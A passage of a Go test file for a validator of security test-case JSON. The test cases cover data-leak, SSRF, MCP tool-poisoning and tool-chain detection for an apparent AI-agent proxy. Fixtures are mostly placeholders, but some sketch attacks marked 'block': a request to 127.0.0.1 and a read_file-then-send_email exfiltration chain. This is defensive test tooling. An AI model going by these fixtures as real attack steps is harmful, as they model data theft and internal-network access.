package main

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// writeCase writes a JSON case file and returns the path.
func writeCase(t *testing.T, dir, subdir, filename, content string) string {
	t.Helper()
	casedir := filepath.Join(dir, subdir)
	if err := os.MkdirAll(casedir, 0o750); err != nil {
		t.Fatal(err)
	}
	path := filepath.Join(casedir, filename)
	if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
		t.Fatal(err)
	}
	return path
}

func TestValidCase(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-test-001.json", `{
		"schema_version": 2,
		"id": "url-test-001",
		"category": "url",
		"title": "Test URL case",
		"description": "Valid URL test case",
		"input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com/test"},
		"expected_verdict": "block",
		"severity": "high",
		"capability_tags": ["url_dlp"],
		"requires": [],
		"false_positive_risk": "low",
		"why_expected": "test_reason",
		"notes": "",
		"source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-test-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors, got: %v", errors)
	}
}

func TestValidBenignCase(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-benign-001.json", `{
		"schema_version": 2,
		"id": "url-benign-001",
		"category": "url",
		"title": "Benign URL case",
		"description": "Valid benign URL test case",
		"input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://api.example.com/data"},
		"expected_verdict": "allow",
		"severity": "low",
		"capability_tags": ["benign"],
		"requires": [],
		"false_positive_risk": "low",
		"why_expected": "normal_api_call",
		"safe_example": true,
		"notes": "",
		"source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-benign-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors, got: %v", errors)
	}
}

func TestMissingPayloadFields(t *testing.T) {
	tests := []struct {
		name      string
		subdir    string
		filename  string
		json      string
		wantError string
	}{
		{
			name:     "header case missing payload.headers",
			subdir:   "headers",
			filename: "header-test-001.json",
			json: `{
				"schema_version": 2, "id": "header-test-001", "category": "headers",
				"title": "T", "description": "D", "input_type": "header",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["header_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload missing required key "headers"`,
		},
		{
			name:     "url case missing payload.url",
			subdir:   "url",
			filename: "url-test-001.json",
			json: `{
				"schema_version": 2, "id": "url-test-001", "category": "url",
				"title": "T", "description": "D", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload missing required key "url"`,
		},
		{
			name:     "request_body case missing payload.body",
			subdir:   "request-body",
			filename: "body-test-001.json",
			json: `{
				"schema_version": 2, "id": "body-test-001", "category": "request_body",
				"title": "T", "description": "D", "input_type": "request_body",
				"transport": "fetch_proxy",
				"payload": {"method": "POST", "url": "https://example.com", "content_type": "application/json"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["request_body_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload missing required key "body"`,
		},
		{
			name:     "response case missing payload.response_body",
			subdir:   "response-fetch",
			filename: "response-test-001.json",
			json: `{
				"schema_version": 2, "id": "response-test-001", "category": "response_fetch",
				"title": "T", "description": "D", "input_type": "response_content",
				"transport": "fetch_proxy",
				"payload": {"url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload missing required key "response_body"`,
		},
		{
			name:     "MCP case missing payload.jsonrpc_messages",
			subdir:   "mcp-input",
			filename: "mcp-test-001.json",
			json: `{
				"schema_version": 2, "id": "mcp-test-001", "category": "mcp_input",
				"title": "T", "description": "D", "input_type": "mcp_tool_call",
				"transport": "mcp_stdio",
				"payload": {"something": "else"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["mcp_input_scan"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload missing required key "jsonrpc_messages"`,
		},
		{
			name:     "MCP case with empty jsonrpc_messages array",
			subdir:   "mcp-input",
			filename: "mcp-test-002.json",
			json: `{
				"schema_version": 2, "id": "mcp-test-002", "category": "mcp_input",
				"title": "T", "description": "D", "input_type": "mcp_tool_call",
				"transport": "mcp_stdio",
				"payload": {"jsonrpc_messages": []},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["mcp_input_scan"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: `payload.jsonrpc_messages must not be empty`,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			writeCase(t, dir, tt.subdir, tt.filename, tt.json)
			ids := make(map[string]string)
			path := filepath.Join(dir, tt.subdir, tt.filename)
			errors := validateFile(path, ids)
			if len(errors) == 0 {
				t.Fatal("expected validation error, got none")
			}
			found := false
			for _, e := range errors {
				if containsStr(e, tt.wantError) {
					found = true
					break
				}
			}
			if !found {
				t.Errorf("expected error containing %q, got: %v", tt.wantError, errors)
			}
		})
	}
}

func TestCategoryInputTypeMismatch(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-tool", "mcp-bad-001.json", `{
		"schema_version": 2, "id": "mcp-bad-001", "category": "mcp_tool",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_tool_poison"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-tool", "mcp-bad-001.json")
	errors := validateFile(path, ids)

	wantInputErr := `category "mcp_tool" does not allow input_type "url"`
	wantTransportErr := `category "mcp_tool" does not allow transport "fetch_proxy"`

	if len(errors) < 2 {
		t.Fatalf("expected at least 2 errors, got %d: %v", len(errors), errors)
	}
	if !containsStr(errors[0], wantInputErr) && !containsStr(errors[1], wantInputErr) {
		t.Errorf("expected error containing %q, got: %v", wantInputErr, errors)
	}
	if !containsStr(errors[0], wantTransportErr) && !containsStr(errors[1], wantTransportErr) {
		t.Errorf("expected error containing %q, got: %v", wantTransportErr, errors)
	}
}

func TestBenignCaseMissingSafeExample(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-benign-bad-001.json", `{
		"schema_version": 2, "id": "url-benign-bad-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "allow", "severity": "low",
		"capability_tags": ["benign"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-benign-bad-001.json")
	errors := validateFile(path, ids)
	if len(errors) == 0 {
		t.Fatal("expected error for missing safe_example, got none")
	}
	found := false
	for _, e := range errors {
		if containsStr(e, "safe_example") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected error about safe_example, got: %v", errors)
	}
}

func TestGauntletCategoryRequiresSource(t *testing.T) {
	dir := t.TempDir()
	// Gauntlet category (ssrf_bypass) with empty source should fail.
	writeCase(t, dir, "ssrf-bypass", "ssrf-test-001.json", `{
		"schema_version": 2, "id": "ssrf-test-001", "category": "ssrf_bypass",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "http://127.0.0.1"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["ssrf_bypass"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "test", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "ssrf-bypass", "ssrf-test-001.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if strings.Contains(e, "non-empty source") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected source enforcement error for gauntlet category, got: %v", errors)
	}
}

func TestGauntletCategoryWithSourcePasses(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "ssrf-bypass", "ssrf-test-002.json", `{
		"schema_version": 2, "id": "ssrf-test-002", "category": "ssrf_bypass",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "http://127.0.0.1"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["ssrf_bypass"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "test", "source": "original"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "ssrf-bypass", "ssrf-test-002.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for gauntlet case with source, got: %v", errors)
	}
}

func TestDuplicateID(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-dup-001.json", `{
		"schema_version": 2, "id": "url-dup-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := map[string]string{"url-dup-001": "some/other/path.json"}
	path := filepath.Join(dir, "url", "url-dup-001.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if containsStr(e, "duplicate id") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected duplicate ID error, got: %v", errors)
	}
}

func TestIDFilenameMismatch(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "wrong-name.json", `{
		"schema_version": 2, "id": "url-test-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "wrong-name.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if containsStr(e, "does not match filename") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected filename mismatch error, got: %v", errors)
	}
}

func TestPayloadHeadersMustBeObject(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "headers", "header-bad-001.json", `{
		"schema_version": 2, "id": "header-bad-001", "category": "headers",
		"title": "T", "description": "D", "input_type": "header",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com", "headers": "not-an-object"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["header_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "headers", "header-bad-001.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if containsStr(e, "payload.headers must be an object") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected object type error, got: %v", errors)
	}
}

func TestWebsocketTransportAllowedForHTTPCategories(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-ws-001.json", `{
		"schema_version": 2, "id": "url-ws-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "websocket",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-ws-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("websocket should be valid for url category, got errors: %v", errors)
	}
}

func TestWebsocketTransportRejectedForMCPCategories(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-input", "mcp-ws-001.json", `{
		"schema_version": 2, "id": "mcp-ws-001", "category": "mcp_input",
		"title": "T", "description": "D", "input_type": "mcp_tool_call",
		"transport": "websocket",
		"payload": {"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_input_scan"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-input", "mcp-ws-001.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if containsStr(e, `does not allow transport "websocket"`) {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected transport rejection for mcp_input+websocket, got: %v", errors)
	}
}

func TestMITMOnlyAllowsHTTPProxy(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "response-mitm", "response-mitm-bad-001.json", `{
		"schema_version": 2, "id": "response-mitm-bad-001", "category": "response_mitm",
		"title": "T", "description": "D", "input_type": "response_content",
		"transport": "fetch_proxy",
		"payload": {"url": "https://example.com", "response_body": "test"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "response-mitm", "response-mitm-bad-001.json")
	errors := validateFile(path, ids)
	found := false
	for _, e := range errors {
		if containsStr(e, `does not allow transport "fetch_proxy"`) {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("expected transport rejection for response_mitm+fetch_proxy, got: %v", errors)
	}
}

func TestCLIRequiresArgument(t *testing.T) {
	// Build the validator binary
	binPath := filepath.Join(t.TempDir(), "validate")
	build := exec.Command("go", "build", "-o", binPath, ".")
	build.Dir = "."
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build failed: %v\n%s", err, out)
	}

	// Run with no arguments
	cmd := exec.Command(binPath)
	output, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatal("expected non-zero exit code with no arguments")
	}
	if !containsStr(string(output), "usage:") {
		t.Errorf("expected usage message, got: %s", output)
	}
}

func TestInvalidSchemaVersion(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-ver-001.json", `{
		"schema_version": 1,
		"id": "url-ver-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-ver-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "schema_version must be 2")
}

func TestInvalidJSON(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-bad-json-001.json", `{not valid json}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-bad-json-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "JSON parse error")
}

func TestMissingRequiredStringFields(t *testing.T) {
	tests := []struct {
		name      string
		json      string
		wantError string
	}{
		{
			name: "missing title",
			json: `{
				"schema_version": 2, "id": "url-notitle-001", "category": "url",
				"title": "", "description": "D", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: "missing title",
		},
		{
			name: "missing description",
			json: `{
				"schema_version": 2, "id": "url-nodesc-001", "category": "url",
				"title": "T", "description": "", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: "missing description",
		},
		{
			name: "missing id",
			json: `{
				"schema_version": 2, "id": "", "category": "url",
				"title": "T", "description": "D", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`,
			wantError: "missing id",
		},
		{
			name: "missing why_expected",
			json: `{
				"schema_version": 2, "id": "url-nowhy-001", "category": "url",
				"title": "T", "description": "D", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "",
				"notes": "", "source": ""
			}`,
			wantError: "missing why_expected",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			// Use a filename that matches the id when present
			fname := "url-test-001.json"
			writeCase(t, dir, "url", fname, tt.json)
			ids := make(map[string]string)
			path := filepath.Join(dir, "url", fname)
			errors := validateFile(path, ids)
			assertContainsError(t, errors, tt.wantError)
		})
	}
}

func TestInvalidEnumValues(t *testing.T) {
	baseJSON := func(field, value string) string {
		category := "url"
		inputType := "url"
		transport := "fetch_proxy"
		verdict := "block"
		severity := "high"
		fpRisk := "low"
		capTags := `["url_dlp"]`

		switch field {
		case "category":
			category = value
		case "input_type":
			inputType = value
		case "transport":
			transport = value
		case "expected_verdict":
			verdict = value
		case "severity":
			severity = value
		case "false_positive_risk":
			fpRisk = value
		case "capability_tags":
			capTags = value
		case "requires":
			return fmt.Sprintf(`{
				"schema_version": 2, "id": "url-enum-001", "category": "url",
				"title": "T", "description": "D", "input_type": "url",
				"transport": "fetch_proxy",
				"payload": {"method": "GET", "url": "https://example.com"},
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [%s],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": ""
			}`, value)
		}

		return fmt.Sprintf(`{
			"schema_version": 2, "id": "url-enum-001", "category": "%s",
			"title": "T", "description": "D", "input_type": "%s",
			"transport": "%s",
			"payload": {"method": "GET", "url": "https://example.com"},
			"expected_verdict": "%s", "severity": "%s",
			"capability_tags": %s, "requires": [],
			"false_positive_risk": "%s", "why_expected": "test",
			"notes": "", "source": ""
		}`, category, inputType, transport, verdict, severity, capTags, fpRisk)
	}

	tests := []struct {
		name      string
		field     string
		value     string
		wantError string
	}{
		{"invalid category", "category", "invalid_cat", `invalid category: "invalid_cat"`},
		{"invalid input_type", "input_type", "magic", `invalid input_type: "magic"`},
		{"invalid transport", "transport", "carrier_pigeon", `invalid transport: "carrier_pigeon"`},
		{"invalid verdict", "expected_verdict", "maybe", `invalid expected_verdict: "maybe"`},
		{"invalid severity info", "severity", "info", `invalid severity: "info"`},
		{"invalid severity warning", "severity", "warning", `invalid severity: "warning"`},
		{"invalid fp_risk", "false_positive_risk", "extreme", `invalid false_positive_risk: "extreme"`},
		{"invalid capability_tag", "capability_tags", `["not_a_tag"]`, `invalid capability_tag: "not_a_tag"`},
		{"invalid requires", "requires", `"not_a_req"`, `invalid requires value: "not_a_req"`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			dir := t.TempDir()
			writeCase(t, dir, "url", "url-enum-001.json", baseJSON(tt.field, tt.value))
			ids := make(map[string]string)
			path := filepath.Join(dir, "url", "url-enum-001.json")
			errors := validateFile(path, ids)
			assertContainsError(t, errors, tt.wantError)
		})
	}
}

func TestEmptyCapabilityTags(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-notags-001.json", `{
		"schema_version": 2, "id": "url-notags-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": [], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-notags-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "capability_tags must not be empty")
}

func TestCategoryDirectoryMismatch(t *testing.T) {
	dir := t.TempDir()
	// Put a URL case in the headers directory
	writeCase(t, dir, "headers", "url-wrongdir-001.json", `{
		"schema_version": 2, "id": "url-wrongdir-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "headers", "url-wrongdir-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `expects directory "url"`)
}

func TestMissingPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-nopay-001.json", `{
		"schema_version": 2, "id": "url-nopay-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-nopay-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "missing payload")
}

func TestPayloadMethodMustBeString(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-badmethod-001.json", `{
		"schema_version": 2, "id": "url-badmethod-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": 42, "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-badmethod-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "payload.method must be a string")
}

func TestMCPToolResultPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-tool", "mcp-tool-valid-001.json", `{
		"schema_version": 2, "id": "mcp-tool-valid-001", "category": "mcp_tool",
		"title": "T", "description": "D", "input_type": "mcp_tool_result",
		"transport": "mcp_stdio",
		"payload": {"jsonrpc_messages": [{"jsonrpc": "2.0", "result": {"content": [{"type": "text", "text": "test"}]}, "id": 1}]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_tool_poison"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-tool", "mcp-tool-valid-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for mcp_tool_result, got: %v", errors)
	}
}

func TestMCPToolDefinitionPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-tool", "mcp-tool-def-001.json", `{
		"schema_version": 2, "id": "mcp-tool-def-001", "category": "mcp_tool",
		"title": "T", "description": "D", "input_type": "mcp_tool_definition",
		"transport": "mcp_http",
		"payload": {"jsonrpc_messages": [{"jsonrpc": "2.0", "result": {"tools": [{"name": "evil", "description": "do bad things"}]}, "id": 1}]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_tool_poison"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-tool", "mcp-tool-def-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for mcp_tool_definition, got: %v", errors)
	}
}

func TestMCPChainPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-chain", "mcp-chain-valid-001.json", `{
		"schema_version": 2, "id": "mcp-chain-valid-001", "category": "mcp_chain",
		"title": "T", "description": "D", "input_type": "mcp_tool_sequence",
		"transport": "mcp_stdio",
		"payload": {"jsonrpc_messages": [
			{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "read_file"}, "id": 1},
			{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "send_email"}, "id": 2}
		]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_chain"], "requires": ["mcp_chain_memory"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-chain", "mcp-chain-valid-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for mcp_chain, got: %v", errors)
	}
}

func TestBudgetPayloadCallCountValid(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-chain", "mcp-chain-dow-valid-001.json", `{
		"schema_version": 2, "id": "mcp-chain-dow-valid-001", "category": "mcp_chain",
		"title": "T", "description": "D", "input_type": "mcp_tool_sequence",
		"transport": "mcp_stdio",
		"payload": {
			"budget_scope": "per_subject",
			"subject_id": "project-alpha",
			"budget_limit_calls": 3,
			"over_budget_call_id": 4,
			"jsonrpc_messages": [
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 1},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 2},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 3},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 4}
			]
		},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_chain", "denial_of_wallet"], "requires": ["mcp_chain_memory"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": "synthetic: test"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-chain", "mcp-chain-dow-valid-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for call-count budget case, got: %v", errors)
	}
}

func TestBudgetPayloadRejectsWeightedUnits(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-chain", "mcp-chain-dow-weighted-001.json", `{
		"schema_version": 2, "id": "mcp-chain-dow-weighted-001", "category": "mcp_chain",
		"title": "T", "description": "D", "input_type": "mcp_tool_sequence",
		"transport": "mcp_stdio",
		"payload": {
			"budget_scope": "per_subject",
			"subject_id": "project-alpha",
			"budget_limit_units": 100,
			"budget_limit_calls": 3,
			"over_budget_call_id": 4,
			"jsonrpc_messages": [
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha", "cost_units": 35}}, "id": 1},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 2},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 3},
				{"jsonrpc": "2.0", "method": "tools/call", "params": {"name": "summarize", "arguments": {"subject_id": "project-alpha"}}, "id": 4}
			]
		},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_chain", "denial_of_wallet"], "requires": ["mcp_chain_memory"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": "synthetic: test"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-chain", "mcp-chain-dow-weighted-001.json")
	errors := validateFile(path, ids)
	if len(errors) < 2 {
		t.Fatalf("expected weighted budget errors, got: %v", errors)
	}
}

func TestResponseMITMValidPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "response-mitm", "response-mitm-valid-001.json", `{
		"schema_version": 2, "id": "response-mitm-valid-001", "category": "response_mitm",
		"title": "T", "description": "D", "input_type": "response_content",
		"transport": "http_proxy",
		"payload": {"url": "https://example.com", "response_body": "<html>injected</html>"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning", "tls_interception"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "response-mitm", "response-mitm-valid-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for response_mitm, got: %v", errors)
	}
}

func TestRequestBodyValidPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "request-body", "request-body-valid-001.json", `{
		"schema_version": 2, "id": "request-body-valid-001", "category": "request_body",
		"title": "T", "description": "D", "input_type": "request_body",
		"transport": "http_proxy",
		"payload": {"method": "POST", "url": "https://example.com", "content_type": "application/json", "body": "{\"key\": \"secret\"}"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["request_body_dlp"], "requires": ["request_body_dlp_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "request-body", "request-body-valid-001.json")
	errors := validateFile(path, ids)
